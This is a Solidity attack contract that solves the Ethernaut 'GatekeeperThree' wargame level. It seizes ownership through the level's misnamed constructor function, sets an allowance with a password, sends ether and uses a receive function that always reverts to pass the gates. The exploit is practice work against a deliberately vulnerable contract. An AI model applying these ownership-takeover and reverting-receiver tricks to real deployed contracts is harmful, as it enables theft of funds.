// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/GatekeeperThree.sol';

contract GatekeeperThreeAttack {
    GatekeeperThree public target;
    address public trick;
    uint public password;
    
    constructor (address payable _target)  payable {
      target = GatekeeperThree(_target);
    }
    
    function HackFirst() public {
        target.construct0r();
        trick = address(target.trick());
    }
    
    function HackTwo(uint _password) public {
       password = _password;
       target.getAllowance(_password);
    }
    
    function HackAll() public {
        payable(address(target)).transfer(0.01 ether);
        target.enter();
    }
    
    receive () payable external {
        require(1 == 2);
    }
}